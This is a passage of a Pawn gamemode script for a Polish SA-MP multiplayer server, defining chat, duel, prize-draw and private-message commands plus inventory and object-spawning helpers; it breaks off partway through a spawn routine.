	if(pAch[playerid][21] < 1) {
		pAch[playerid][21] = 1;
		AddExp(playerid, 200);
		Sound(playerid,1137,0.0,0.0,0.0);
		SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Wierny do koñca", "New achievement: "C_NICK"Wierny do koñca"); }
	return 1;
}

CMD:time(playerid, params[]) return cmd_czas(playerid, params);
CMD:czas(playerid, params[])
{
	new phour, pminute;
	if(sscanf(params, "ii", phour, pminute)) return SyntaxError(playerid, "{01FCFF}/czas [godzina] [minuta]");
	if(Player[playerid][HasRealTime]) return SendClientMessage(playerid, RED, "Posiadasz w³¹czony realny czas.");
	SetPlayerTime(playerid, phour, pminute);
	return 1;
}

CMD:pogoda(playerid, params[]) {
	new phour;
	if(sscanf(params, "i", phour)) return SyntaxError(playerid, "{01FCFF}/pogoda [id]");
	SetPlayerWeather(playerid, phour);
	return 1; }

CMD:szukam(playerid, params[])
{
   	if(GetPVarInt(playerid,"Szuka") > gettime())
		return SendClientMessage(playerid, RED, "Nie mo¿esz nadu¿ywaæ tej komendy.");
    SetPVarInt(playerid,"Szuka",gettime()+60);
    new likeunstr[256];
    format(likeunstr, sizeof(likeunstr), ""PYTAJNIK""C_NICK"%s(%d) {68F442}szuka towarzysza do gry!", Player[playerid][Name], playerid);
	SendClientMessageToAll(-1, likeunstr);
	return 1;
}

CMD:like(playerid, params[])
{
   	if(GetPVarInt(playerid,"Like") > gettime())
		return SendClientMessage(playerid, RED, "Nie mo¿esz nadu¿ywaæ tej komendy.");
    SetPVarInt(playerid,"Like",gettime()+30);
    new Float:x, Float:y, Float:z;
    GetPlayerPos(playerid, x, y, z);
    new likeunstr[256];
    format(likeunstr, sizeof(likeunstr), ""PYTAJNIK""C_WHITE"%s(%d) {3b5998}pokazuje Ci ³apkê w górê!", Player[playerid][Name], playerid);
    Loop(loopid, MAX_PLAYERS)
	{
		if(IsPlayerInRangeOfPoint(loopid, 25.0, x, y, z))
		{
		    Sound(loopid, 1057, 0.0, 0.0, 0.0);
		    SendClientMessage(loopid, -1, likeunstr);
		}
	}
	return 1;
}

CMD:dislike(playerid, params[])
{
   	if(GetPVarInt(playerid,"Like") > gettime())
		return SendClientMessage(playerid, RED, "Nie mo¿esz nadu¿ywaæ tej komendy.");
    SetPVarInt(playerid,"Like",gettime()+30);
    new Float:x, Float:y, Float:z;
    GetPlayerPos(playerid, x, y, z);
    new likeunstr[256];
    format(likeunstr, sizeof(likeunstr), ""PYTAJNIK""C_WHITE"%s(%d) {FF0000}pokazuje Ci ³apkê w dó³.", Player[playerid][Name], playerid);
    Loop(loopid, MAX_PLAYERS)
	{
		if(IsPlayerInRangeOfPoint(loopid, 25.0, x, y, z))
		{
		    Sound(loopid, 1053, 0.0, 0.0, 0.0);
		    SendClientMessage(loopid, -1, likeunstr);
		}
	}
	return 1;
}

CMD:odlicz(playerid, params[])
{
   	if(GetPVarInt(playerid,"Odlicz") > gettime())
		return SendClientMessage(playerid, RED, "Nie mo¿esz nadu¿ywaæ tej komendy.");
    SetPVarInt(playerid,"Odlicz",gettime()+30);
    new Float:x, Float:y, Float:z;
    GetPlayerPos(playerid, x, y, z);
    Loop(loopid, MAX_PLAYERS) { if(IsPlayerInRangeOfPoint(loopid, 15.0, x, y, z)) Countdown[loopid] = 5; }
	return 1;
}

CMD:up(playerid, params[])
{
    if(GetPlayerState(playerid) == PLAYER_STATE_PASSENGER) return DialogError(playerid, "{FFFF00}Przed u¿yciem tej komendy opuœæ pojazd.");
	if(Freezed[playerid]) return SendClientMessage(playerid, RED, ""C_RED"Nie mo¿esz teraz wykonaæ tej komendy.");
	new Float:p[3];
   	if(GetPVarInt(playerid,"Skok") > gettime()) return DialogError(playerid, "{FFFF00}Nie mo¿esz nadu¿ywaæ podrzucania siê.");
    SetPVarInt(playerid,"Skok",gettime()+10);
	if(IsPlayerInAnyVehicle(playerid))
	{
		GetVehiclePos(GetPlayerVehicleID(playerid), p[0], p[1], p[2]);
		SetVehiclePos(GetPlayerVehicleID(playerid), p[0], p[1], p[2] + 200);
	}
	else
	{
		GetPlayerPos(playerid, p[0], p[1], p[2]);
		GivePlayerWeapon(playerid, 46, 1);
		SetPlayerPos(playerid, p[0], p[1], p[2] + 200);
	}
	return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"¯yczymy przyjemnego lotu.");
}

CMD:draw(playerid, params[]) return cmd_losowanie(playerid, params);
CMD:losowanie(playerid, params[])
{
   	if(GetPVarInt(playerid,"Losuj") > gettime()) return DialogError(playerid, "{FFFF00}Losowaæ mo¿esz co minutê.");
   	if(Player[playerid][Exp] < 3) return DialogError(playerid, "{FFFF00}Musisz mieæ minimum "C_WHITE"3 EXP{FFFF00}.");
    SetPVarInt(playerid,"Losuj",gettime()+60);
    new msgs[256], msgsen[256];
    switch(random(8))
    {
        case 0:
        {
			format(msgs, sizeof(msgs), ""PYTAJNIK""C_NICK"%s(%d) {AEDCD8}wygra³ 25 EXP w "C_YELLOW"/losowanie{AEDCD8}.", Player[playerid][Name], playerid);
			format(msgsen, sizeof(msgsen), ""PYTAJNIK""C_NICK"%s(%d) {AEDCD8}won 25 EXP in "C_YELLOW"/draw{AEDCD8}.", Player[playerid][Name], playerid);
			AddExp(playerid, 25);
		}
        case 1:
        {
			if(ReflexType == 9) {
				AddExp(playerid, 40);
				Player[playerid][Cash] += 5000;
				Player[playerid][Czat]++;
  				new kodstr[256];
	  			format(kodstr, sizeof(kodstr), "{ff7768}[Reflex] "C_WHITE"%s(%d) {ff7768}wykonuje wyzwanie jako pierwszy!", Player[playerid][Name], playerid);
				SendClientMessageToAll(-1, kodstr);
				ReflexType = -1;
				ReflexActive = false;
				Loop(loopid, MAX_PLAYERS) {
		    		if(IsPlayerConnected(loopid) && TDOn[loopid]) HideReflex(loopid); } }
			format(msgs, sizeof(msgs), ""PYTAJNIK""C_NICK"%s(%d) {AEDCD8}wygra³ 5 EXP w "C_YELLOW"/losowanie{AEDCD8}.", Player[playerid][Name], playerid);
			format(msgsen, sizeof(msgsen), ""PYTAJNIK""C_NICK"%s(%d) {AEDCD8}won 5 EXP in "C_YELLOW"/draw{AEDCD8}.", Player[playerid][Name], playerid);
			AddExp(playerid, 5);
		}
        case 2:
        {
			format(msgs, sizeof(msgs), ""PYTAJNIK""C_NICK"%s(%d) {AEDCD8}wygra³ -3 EXP w "C_YELLOW"/losowanie{AEDCD8}.", Player[playerid][Name], playerid);
			format(msgsen, sizeof(msgsen), ""PYTAJNIK""C_NICK"%s(%d) {AEDCD8}won -3 EXP in "C_YELLOW"/draw{AEDCD8}.", Player[playerid][Name], playerid);
			Player[playerid][Exp] -= 3;
		}
        case 3:
        {
			format(msgs, sizeof(msgs), ""PYTAJNIK""C_NICK"%s(%d) {AEDCD8}wygra³ 10000$ w "C_YELLOW"/losowanie{AEDCD8}.", Player[playerid][Name], playerid);
			format(msgsen, sizeof(msgsen), ""PYTAJNIK""C_NICK"%s(%d) {AEDCD8}won 10000$ in "C_YELLOW"/draw{AEDCD8}.", Player[playerid][Name], playerid);
			Player[playerid][Cash] += 10000;
		}
        case 4: {
			format(msgs, sizeof(msgs), ""PYTAJNIK""C_NICK"%s(%d) {AEDCD8}nic nie wygra³ w "C_YELLOW"/losowanie{AEDCD8}.", Player[playerid][Name], playerid);
			format(msgsen, sizeof(msgsen), ""PYTAJNIK""C_NICK"%s(%d) {AEDCD8}won nothing in "C_YELLOW"/draw{AEDCD8}.", Player[playerid][Name], playerid); }
        case 5:
        {
			format(msgs, sizeof(msgs), ""PYTAJNIK""C_NICK"%s(%d) {AEDCD8}wygra³ killa w "C_YELLOW"/losowanie{AEDCD8}.", Player[playerid][Name], playerid);
			format(msgsen, sizeof(msgsen), ""PYTAJNIK""C_NICK"%s(%d) {AEDCD8}won death in "C_YELLOW"/draw{AEDCD8}.", Player[playerid][Name], playerid);
           	Suicided[playerid] = true;
			SetPlayerHealth(playerid, 0.0);
		}
        case 6:
        {
			if(ReflexType == 10) {
                AddExp(playerid, 40);
				Player[playerid][Cash] += 5000;
				Player[playerid][Czat]++;
  				new kodstr[256];
	  			format(kodstr, sizeof(kodstr), "{ff7768}[Reflex] "C_WHITE"%s(%d) {ff7768}wykonuje wyzwanie jako pierwszy!", Player[playerid][Name], playerid);
				SendClientMessageToAll(-1, kodstr);
				ReflexType = -1;
				ReflexActive = false;
				Loop(loopid, MAX_PLAYERS) {
		    		if(IsPlayerConnected(loopid) && TDOn[loopid]) HideReflex(loopid); } }
			format(msgs, sizeof(msgs), ""PYTAJNIK""C_NICK"%s(%d) {AEDCD8}wygra³ losowy teleport w "C_YELLOW"/losowanie{AEDCD8}.", Player[playerid][Name], playerid);
			format(msgsen, sizeof(msgsen), ""PYTAJNIK""C_NICK"%s(%d) {AEDCD8}won random teleport in "C_YELLOW"/draw{AEDCD8}.", Player[playerid][Name], playerid);
			RandomTP(playerid);
		}
        case 7:
        {
			format(msgs, sizeof(msgs), ""PYTAJNIK""C_NICK"%s(%d) {AEDCD8}wygra³ stratê broni w "C_YELLOW"/losowanie{AEDCD8}.", Player[playerid][Name], playerid);
			format(msgsen, sizeof(msgsen), ""PYTAJNIK""C_NICK"%s(%d) {AEDCD8}won disarm in "C_YELLOW"/draw{AEDCD8}.", Player[playerid][Name], playerid);
			ResetPlayerWeapons(playerid);
		}
	}
 	SendClientMessageToAllEx(WHITE, msgs, msgsen);
 	Loop(loopid, MAX_PLAYERS) Sound(loopid, 1138, 0.0, 0.0, 0.0);
	return 1;
}

CMD:witam(playerid, params[]) return cmd_siema(playerid, params); 
CMD:elo(playerid, params[]) return cmd_siema(playerid, params);
CMD:siema(playerid, params[])
{
   	if(GetPVarInt(playerid,"SiemaNaj") > gettime())
		return SendClientMessage(playerid, RED, "Nie mo¿esz nadu¿ywaæ komend wyœwietlanych na czacie.");
    SetPVarInt(playerid,"SiemaNaj",gettime()+60);
	if(ReflexType == 11) {
		AddExp(playerid, 40);
		Player[playerid][Cash] += 5000;
		Player[playerid][Czat]++;
  		new kodstr[256];
	  	format(kodstr, sizeof(kodstr), "{ff7768}[Reflex] "C_WHITE"%s(%d) {ff7768}wykonuje wyzwanie jako pierwszy!", Player[playerid][Name], playerid);
		SendClientMessageToAll(-1, kodstr);
		ReflexType = -1;
		ReflexActive = false;
		Loop(loopid, MAX_PLAYERS) {
		    if(IsPlayerConnected(loopid) && TDOn[loopid]) HideReflex(loopid); } }
    new msgs[256];
	format(msgs, sizeof(msgs), ""PYTAJNIK""C_NICK"%s(%d) {c7fcf7}wita siê ze wszystkimi!", Player[playerid][Name], playerid);
 	SendClientMessageToAll(WHITE, msgs);
	return 1;
}

CMD:nara(playerid, params[]) 
{
   	if(GetPVarInt(playerid,"SiemaNaj") > gettime())
		return SendClientMessage(playerid, RED, "Nie mo¿esz nadu¿ywaæ komend wyœwietlanych na czacie.");
    SetPVarInt(playerid,"SiemaNaj",gettime()+60);
    new msgs[256];
	format(msgs, sizeof(msgs), ""PYTAJNIK""C_NICK"%s(%d) {c7fcf7}¿egna siê ze wszystkimi!", Player[playerid][Name], playerid);
 	SendClientMessageToAll(WHITE, msgs);
	return 1;
}

CMD:gz(playerid, params[]) 
{
    new senderid;
    if(sscanf(params,"i", senderid)) return SyntaxError(playerid, "{01FCFF}/gz [playerid]");
 	if(!IsPlayerConnected(senderid)) return SendClientMessage(playerid, RED, "Gracz o podanym ID nie jest po³¹czony.");
	if(senderid == playerid) return SendClientMessage(playerid, RED, "Podane ID jest nieprawid³owe.");
	if(zw[senderid] > 0) return SendClientMessage(playerid, RED, "Ten gracz posiada status ZW.");
   	PlayerPlaySound(senderid, 40405, 0.0, 0.0, 0.0);
   	new msgs[1024];
   	switch(random(5))
   	{
		case 0: format(msgs, sizeof(msgs), "{9f96ff}@%s#%d"C_WHITE" gz", Player[senderid][Name], senderid);
		case 1: format(msgs, sizeof(msgs), "{9f96ff}@%s#%d"C_WHITE" gratulacje. :D", Player[senderid][Name], senderid);
		case 2: format(msgs, sizeof(msgs), "{9f96ff}@%s#%d"C_WHITE" gratulujê", Player[senderid][Name], senderid);
		case 3: format(msgs, sizeof(msgs), "{9f96ff}@%s#%d"C_WHITE" gratulacje", Player[senderid][Name], senderid);
		case 4: format(msgs, sizeof(msgs), "{9f96ff}@%s#%d"C_WHITE" dobra robota", Player[senderid][Name], senderid);
	}
	if(ReflexType == 12) {
		AddExp(playerid, 40);
		Player[playerid][Cash] += 5000;
		Player[playerid][Czat]++;
  		new kodstr[256];
	  	format(kodstr, sizeof(kodstr), "{ff7768}[Reflex] "C_WHITE"%s(%d) {ff7768}wykonuje wyzwanie jako pierwszy!", Player[playerid][Name], playerid);
		SendClientMessageToAll(-1, kodstr);
		ReflexType = -1;
		ReflexActive = false;
		Loop(loopid, MAX_PLAYERS) {
		    if(IsPlayerConnected(loopid) && TDOn[loopid]) HideReflex(loopid); } }
	return OnPlayerText(playerid, msgs), 1;
}


CMD:do(playerid, params[]) 
{
	if(Player[playerid][MuteTime] > gettime())
	{
	    new msgs[256];
	    format(msgs, sizeof(msgs), "Posiadasz uciszenie na "C_WHITE"%s"C_RED"s.", TimeConvert(Player[playerid][MuteTime] - gettime()));
 		return SendClientMessage(playerid, RED, msgs), 0;
	}
	if(isnull(params))
	{
	    SendClientMessage(playerid, -1, "Aby u¿yæ {00AAFF}/do "C_WHITE"w celu napisania do innego gracza, wykonaj komendê {00AAFF}/do [playerid] [wiadomoœæ]"C_WHITE".");
		new dostr[512];
		format(dostr, sizeof(dostr), ""C_WHITE"Wpisz wiadomoœæ któr¹ chcesz wys³aæ w stylu RP.\n\n"C_ORANGE"Przyk³ad:\n"C_WHITE"Po wpisaniu "C_ORANGE"odje¿d¿a z parkingu samochodowego"C_WHITE" na czacie bêdzie to widoczne jako: "C_ORANGE"* "C_WHITE"%s", Player[playerid][Name]);
		format(dostr, sizeof(dostr), "%s "C_ORANGE"odje¿d¿a z parkingu samochodowego"C_WHITE".", dostr);
		ShowPlayerDialog(playerid, DIALOG_DO, DIALOG_STYLE_INPUT, ""C_BLUE1"Odgrywanie akcji RP", dostr, "Wyœlij", "Zamknij");
	}
	else
	{
	    new senderid, dotekst[128];
	    if(sscanf(params,"is[64]", senderid, dotekst)) return SyntaxError(playerid, "{01FCFF}/do [playerid] [wiadomoœæ]");
 		if(!IsPlayerConnected(senderid)) return SendClientMessage(playerid, RED, "Gracz o podanym ID nie jest po³¹czony.");
		if(senderid == playerid) return SendClientMessage(playerid, RED, "Podane ID jest nieprawid³owe.");
		if(zw[senderid] > 0) return SendClientMessage(playerid, RED, "Ten gracz posiada status ZW.");
		if(AFKPoints[playerid] == 0) return SendClientMessage(playerid, RED, "Ten gracz jest AFK.");
	    PlayerPlaySound(senderid, 40405, 0.0, 0.0, 0.0);
    	new msgs[1024];
		format(msgs, sizeof(msgs), "{9f96ff}@%s#%d"C_WHITE" %s", Player[senderid][Name], senderid, dotekst);
 		return OnPlayerText(playerid, msgs), 1;
	}
	return 1;
}

CMD:solo(playerid, params[])
{
	new oponnentid, theWeapon[2];
	if(GetPVarInt(playerid,"Soloo") > gettime()) return DialogError(playerid, "{FFFF00}Ostatnio wyzywa³eœ kogoœ na pojedynek solo.");
	if(sscanf(params, "udd", oponnentid, theWeapon[0], theWeapon[1])) return SyntaxError(playerid, "{01FCFF}/solo [playerid] [broñ 1] [broñ 2]");
	if(oponnentid == playerid) return DialogError(playerid, "{FFFF00}Nie mo¿esz walczyæ sam ze sob¹.");
	if(!IsPlayerConnected(oponnentid)) return SendClientMessage(playerid, RED, "Podane ID jest nieprawid³owe.");
	if(GetPlayerVirtualWorld(oponnentid) || !Player[oponnentid][HasUnlockedSolo] || OnTutorial[oponnentid] || AFKPoints[oponnentid] == 0) return SendClientMessage(playerid, RED, "Nie mo¿esz rozegraæ pojedynku solo z tym graczem.");
    if(OnNonDM[playerid] || OnNonDM[oponnentid]) return SendClientMessage(playerid, RED, "Któryœ z was znajduje siê w strefie bez DM.");
	if(!IsWeapon(theWeapon[0])) return DialogError(playerid, "{FFFF00}Wybrano nieprawid³owe bronie.\nDostêpne ID broni sprawdzisz pod "C_WHITE"/gunsid{FFFF00}.");
	if(!IsWeapon(theWeapon[1])) theWeapon[1] = 0;
   	SetPVarInt(playerid,"Soloo",gettime()+25);

	pEnemy[playerid] = oponnentid;
	pEnemy[oponnentid] = playerid;
	soloWeapon[playerid] = theWeapon;

	new s[1024];
	format(s, 1024, ""C_NICK"%s(%d) "C_RED"wyzywa Ciê na pojedynek solo!\n", Player[playerid][Name], playerid);
	format(s, 1024, "%s"C_RED"Bronie:: "C_BLUE1"%s"C_RED", "C_BLUE1"%s", s, ReturnWeaponName(theWeapon[0]), ReturnWeaponName(theWeapon[1]));
	return ShowPlayerDialog(oponnentid, DIALOG_ACCEPTDUEL, DIALOG_STYLE_MSGBOX, ""C_BLUE1"Wyzwanie na pojedynek", s, "Akceptuj", "Odrzuæ");
}

CMD:msg(playerid, params[]) return cmd_pm(playerid, params); 
CMD:pw(playerid, params[]) return cmd_pm(playerid, params);
CMD:pm(playerid, params[])
{
	new senderid, dotekst[128];
 	if(sscanf(params,"is[128]", senderid, dotekst)) return SyntaxError(playerid, "{01FCFF}/pm [playerid] [wiadomoœæ]");
	if(!IsPlayerConnected(senderid)) return SendClientMessage(playerid, RED, "Gracz o podanym ID nie jest po³¹czony.");
	if(zw[senderid] > 0) return SendClientMessage(playerid, RED, "Ten gracz posiada status ZW.");
	if(AFKPoints[playerid] == 0) return SendClientMessage(playerid, RED, "Ten gracz jest AFK.");
	if(senderid == playerid) return SendClientMessage(playerid, RED, "Podane ID jest nieprawid³owe.");
 	PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0);
 	PlayerPlaySound(senderid, 1057, 0.0, 0.0, 0.0);
 	new msgs[512], msgsen[512];
	format(msgs, sizeof(msgs), "{e1be32}[pm] Wiadomoœæ do %s(%d): %s", Player[senderid][Name], senderid, dotekst);
	format(msgsen, sizeof(msgsen), "{e1be32}[pm] Message to %s(%d): %s", Player[senderid][Name], senderid, dotekst);
	SendClientMessageEx(playerid, WHITE, msgs, msgsen);
	format(msgs, sizeof(msgs), ""C_YELLOW"[pm] Wiadomoœæ od %s(%d): %s", Player[playerid][Name], playerid, dotekst);
	format(msgsen, sizeof(msgsen), ""C_YELLOW"[pm] Message from %s(%d): %s", Player[playerid][Name], playerid, dotekst);
	SendClientMessageEx(senderid, WHITE, msgs, msgsen);
	new prstr[256];
  	format(prstr, sizeof(prstr), "[pm] %s do %s: %s", Player[playerid][Name], Player[senderid][Name], dotekst);
   	print(prstr);
	LastPM[senderid] = playerid;
	Loop(loopid, MAX_PLAYERS)
	{
	    if(Player[loopid][Admin] > 0 && Player[loopid][IsLoggedIn] && !BustedMode[loopid])
	    {
	        new pmeye[256];
	        format(pmeye, sizeof(pmeye), "{ff8000}[pm] {c68b11}%s(%d) --> %s(%d): %s", Player[playerid][Name], playerid, Player[senderid][Name], senderid, dotekst);
			SendClientMessage(loopid, -1, pmeye);
	    }
	}
  	new msg[256];
	format(msg, sizeof(msg), "[%02d:%02d:%02d] [pm] (%d) %s -> (%d) %s: %s", hour, minute, second, playerid, Player[playerid][Name], senderid, Player[senderid][Name], dotekst);
   	DCC_SendChannelMessage(samp_admin, msg);
	return 1;
}

CMD:re(playerid, params[]) 
{
	new dotekst[128];
 	if(sscanf(params,"s[128]", dotekst)) return SyntaxError(playerid, "{01FCFF}/re [wiadomoœæ]");
	if(!IsPlayerConnected(LastPM[playerid])) return SendClientMessage(playerid, RED, "Gracz o podanym ID nie jest po³¹czony.");
	if(LastPM[playerid] == -1) return DialogError(playerid, "{FFFF00}Nie otrzyma³eœ ostatnio ¿adnej wiadomoœci.");
	if(LastPM[playerid] == playerid) return SendClientMessage(playerid, RED, "Podane ID jest nieprawid³owe.");
 	PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0);
 	PlayerPlaySound(LastPM[playerid], 1057, 0.0, 0.0, 0.0);
 	new msgs[512], msgsen[512];
	format(msgs, sizeof(msgs), "{e1be32}[pm] Wiadomoœæ do %s(%d): %s", Player[LastPM[playerid]][Name], LastPM[playerid], dotekst);
	format(msgsen, sizeof(msgsen), "{e1be32}[pm] Message to %s(%d): %s", Player[LastPM[playerid]][Name], LastPM[playerid], dotekst);
	SendClientMessageEx(playerid, WHITE, msgs, msgsen);
	format(msgs, sizeof(msgs), ""C_YELLOW"[pm] Wiadomoœæ od %s(%d): %s", Player[playerid][Name], playerid, dotekst);
	format(msgsen, sizeof(msgsen), ""C_YELLOW"[pm] Message from %s(%d): %s", Player[playerid][Name], playerid, dotekst);
	new prstr[256];
  	format(prstr, sizeof(prstr), "[pm] %s do %s: %s", Player[playerid][Name], Player[LastPM[playerid]][Name], dotekst);
   	print(prstr);
	SendClientMessageEx(LastPM[playerid], WHITE, msgs, msgsen);
	new senderid = LastPM[playerid];
	Loop(loopid, MAX_PLAYERS)
	{
	    if(Player[loopid][Admin] > 0)
	    {
	        new pmeye[256];
	        format(pmeye, sizeof(pmeye), "{ff8000}[pm] {c68b11}%s(%d) --> %s(%d): %s", Player[playerid][Name], playerid, Player[senderid][Name], senderid, dotekst);
	    }
	}
	LastPM[playerid] = -1;
	LastPM[senderid] = playerid;
	return 1;
}

CMD:yt(playerid, params[])
{
    if(isnull(params)) return SyntaxError(playerid, "{01FCFF}/yt [url]");
    format(params, 145, "http://www.youtubeinmp3.com/fetch/?video=%s", params);
    PlayAudioStreamForPlayer(playerid, params);
    return 1;
}

stock timediff(seconds, &d,&h,&m,&s)
{
  	if(seconds < 0)
	{
		d = 0;
		h = 0;
		m = 0;
		s = 0;
		return;
    }

  	d= seconds;

  	s= d % 60; d -= s;
  	m= d % 3600; d -= m;
  	h= d % 86400; d -= h;

  	m /= 60; h /= 3600; d /= 86400;
}

stock RemoveItem(playerid,item[],amount)
{
	if(CompareEx(Player[playerid][ItemName1],item))
	{
		if(Player[playerid][ItemAmount1] < amount) Player[playerid][ItemAmount1] = 0;
		Player[playerid][ItemAmount1] -= amount;
		if(Player[playerid][ItemAmount1] < 1 && CompareEx(Player[playerid][ItemName1],item)) return format(Player[playerid][ItemName1], 256, "Brak");
		return 1;
	}
	if(CompareEx(Player[playerid][ItemName2],item))
	{
		if(Player[playerid][ItemAmount2] < amount) Player[playerid][ItemAmount2] = 0;
		Player[playerid][ItemAmount2] -= amount;
		if(Player[playerid][ItemAmount2] < 1 && CompareEx(Player[playerid][ItemName2],item)) return format(Player[playerid][ItemName2], 256, "Brak");
		return 1;
	}
	if(CompareEx(Player[playerid][ItemName3],item))
	{
		if(Player[playerid][ItemAmount3] < amount) Player[playerid][ItemAmount3] = 0;
		Player[playerid][ItemAmount3] -= amount;
		if(Player[playerid][ItemAmount3] < 1 && CompareEx(Player[playerid][ItemName3],item)) return format(Player[playerid][ItemName3], 256, "Brak");
		return 1;
	}
	if(CompareEx(Player[playerid][ItemName4],item))
	{
		if(Player[playerid][ItemAmount4] < amount) Player[playerid][ItemAmount4] = 0;
		Player[playerid][ItemAmount4] -= amount;
		if(Player[playerid][ItemAmount4] < 1 && CompareEx(Player[playerid][ItemName4],item)) return format(Player[playerid][ItemName4], 256, "Brak");
		return 1;
	}
	if(CompareEx(Player[playerid][ItemName5],item))
	{
		if(Player[playerid][ItemAmount5] < amount) Player[playerid][ItemAmount5] = 0;
		Player[playerid][ItemAmount5] -= amount;
		if(Player[playerid][ItemAmount5] < 1 && CompareEx(Player[playerid][ItemName5],item)) return format(Player[playerid][ItemName5], 256, "Brak");
		return 1;
	}
	if(CompareEx(Player[playerid][ItemName6],item))
	{
		if(Player[playerid][ItemAmount6] < amount) Player[playerid][ItemAmount6] = 0;
		Player[playerid][ItemAmount6] -= amount;
		if(Player[playerid][ItemAmount6] < 1 && CompareEx(Player[playerid][ItemName6],item)) return format(Player[playerid][ItemName6], 256, "Brak");
		return 1;
	}
	if(CompareEx(Player[playerid][ItemName7],item))
	{
		if(Player[playerid][ItemAmount7] < amount) Player[playerid][ItemAmount7] = 0;
		Player[playerid][ItemAmount7] -= amount;
		if(Player[playerid][ItemAmount7] < 1 && CompareEx(Player[playerid][ItemName7],item)) return format(Player[playerid][ItemName7], 256, "Brak");
		return 1;
	}
	if(CompareEx(Player[playerid][ItemName8],item))
	{
		if(Player[playerid][ItemAmount8] < amount) Player[playerid][ItemAmount8] = 0;
		Player[playerid][ItemAmount8] -= amount;
		if(Player[playerid][ItemAmount8] < 1 && CompareEx(Player[playerid][ItemName8],item)) return format(Player[playerid][ItemName8], 256, "Brak");
		return 1;
	}
	return 1;
}

forward TrawaResp(playerid);
public TrawaResp(playerid)
{
	switch(random(18))
	{
	    case 0:
	    {
	        AktywnaTrawa[playerid] = 0;
	        TrawaCoords[playerid][0][0] = -25.8151370;
	        TrawaCoords[playerid][1][0] = -52.5065870;
	        TrawaCoords[playerid][2][0] = 3.1171870;
	    	TrawaO[playerid] = CreateDynamicObject(811,-25.8151370,-52.5065870,3.1171870,0.0000000,0.0000000,0.0000000, playerid + 31); //
	    }
	    case 1:
	    {
	        AktywnaTrawa[playerid] = 1;
	        TrawaCoords[playerid][0][1] = 1.8638660;
	        TrawaCoords[playerid][1][1] = -92.5396490;
	        TrawaCoords[playerid][2][1] = 2.4687020;
	    	TrawaO[playerid] = CreateDynamicObject(811,1.8638660,-92.5396490,2.4687020,0.0000000,0.0000000,0.0000000, playerid + 31); //
	    }
	    case 2:
	    {
	        AktywnaTrawa[playerid] = 2;
	        TrawaCoords[playerid][0][2] = -32.2402490;
	        TrawaCoords[playerid][1][2] = -99.5510780;
	        TrawaCoords[playerid][2][2] = 3.1171870;
	    	TrawaO[playerid] = CreateDynamicObject(811,-32.2402490,-99.5510780,3.1171870,0.0000000,0.0000000,0.0000000, playerid + 31); //
	    }
	    case 3:
	    {
	        AktywnaTrawa[playerid] = 3;
	        TrawaCoords[playerid][0][3] = -14.1921420;
	        TrawaCoords[playerid][1][3] = -66.5919110;
	        TrawaCoords[playerid][2][3] = 3.1171870;
	    	TrawaO[playerid] = CreateDynamicObject(811,-14.1921420,-66.5919110,3.1171870,0.0000000,0.0000000,0.0000000, playerid + 31); //
	    }
	    case 4:
	    {
	        AktywnaTrawa[playerid] = 4;
	        TrawaCoords[playerid][0][4] = -0.2562260;
	        TrawaCoords[playerid][1][4] = -35.3874350;
	        TrawaCoords[playerid][2][4] = 3.1171870;
	    	TrawaO[playerid] = CreateDynamicObject(811,-0.2562260,-35.3874350,3.1171870,0.0000000,0.0000000,0.0000000, playerid + 31); //
	    }
	    case 5:
	    {
	        AktywnaTrawa[playerid] = 5;
	        TrawaCoords[playerid][0][5] = -13.0937270;
	        TrawaCoords[playerid][1][5] = -7.2516530;
	        TrawaCoords[playerid][2][5] = 3.1171870;
	    	TrawaO[playerid] = CreateDynamicObject(811,-13.0937270,-7.2516530,3.1171870,0.0000000,0.0000000,0.0000000, playerid + 31); //
	    }
	    case 6:
	    {
	        AktywnaTrawa[playerid] = 6;
	        TrawaCoords[playerid][0][6] = 26.7246390;
	        TrawaCoords[playerid][1][6] = -58.3602790;
	        TrawaCoords[playerid][2][6] = 2.4471880;
	    	TrawaO[playerid] = CreateDynamicObject(811,26.7246390,-58.3602790,2.4471880,0.0000000,0.0000000,0.0000000, playerid + 31); //
	    }
	    case 7:
	    {
	        AktywnaTrawa[playerid] = 7;
	        TrawaCoords[playerid][0][7] = 42.2421450;
	        TrawaCoords[playerid][1][7] = -81.9888530;
	        TrawaCoords[playerid][2][7] = 0.6602240;
	    	TrawaO[playerid] = CreateDynamicObject(811,42.2421450,-81.9888530,0.6602240,0.0000000,0.0000000,0.0000000, playerid + 31); //
	    }
	    case 8:
	    {
	        AktywnaTrawa[playerid] = 8;
	        TrawaCoords[playerid][0][8] = 46.3232260;
	        TrawaCoords[playerid][1][8] = -109.9204940;
	        TrawaCoords[playerid][2][8] = 0.6168530;
	    	TrawaO[playerid] = CreateDynamicObject(811,46.3232260,-109.9204940,0.6168530,0.0000000,0.0000000,0.0000000, playerid + 31); //
	    }
	    case 9:
	    {
	        AktywnaTrawa[playerid] = 9;
	        TrawaCoords[playerid][0][9] = 6.7267700;
	        TrawaCoords[playerid][1][9] = -112.0692820;
	        TrawaCoords[playerid][2][9] = 0.6093750;
	    	TrawaO[playerid] = CreateDynamicObject(811,6.7267700,-112.0692820,0.6093750,0.0000000,0.0000000,0.0000000, playerid + 31); //
	    }
	    case 10:
	    {
	        AktywnaTrawa[playerid] = 10;
	        TrawaCoords[playerid][0][10] = 6.8801820;
	        TrawaCoords[playerid][1][10] = -69.3993600;
	        TrawaCoords[playerid][2][10] = 3.1171870;
	    	TrawaO[playerid] = CreateDynamicObject(811,6.8801820,-69.3993600,3.1171870,0.0000000,0.0000000,0.0000000, playerid + 31); //
	    }
	    case 11:
	    {
	        AktywnaTrawa[playerid] = 11;
	        TrawaCoords[playerid][0][11] = -18.7131860;
	        TrawaCoords[playerid][1][11] = -34.2373650;
	        TrawaCoords[playerid][2][11] = 3.1171870;
	    	TrawaO[playerid] = CreateDynamicObject(811,-18.7131860,-34.2373650,3.1171870,0.0000000,0.0000000,0.0000000, playerid + 31); //
	    }
	    case 12:
	    {
	        AktywnaTrawa[playerid] = 12;
	        TrawaCoords[playerid][0][12] = 18.3504650;
	        TrawaCoords[playerid][1][12] = -36.0912430;
	        TrawaCoords[playerid][2][12] = 3.1171870;
	    	TrawaO[playerid] = CreateDynamicObject(811,18.3504650,-36.0912430,3.1171870,0.0000000,0.0000000,0.0000000, playerid + 31); //
	    }
	    case 13:
	    {
	        AktywnaTrawa[playerid] = 13;
	        TrawaCoords[playerid][0][13] = -12.4005200;
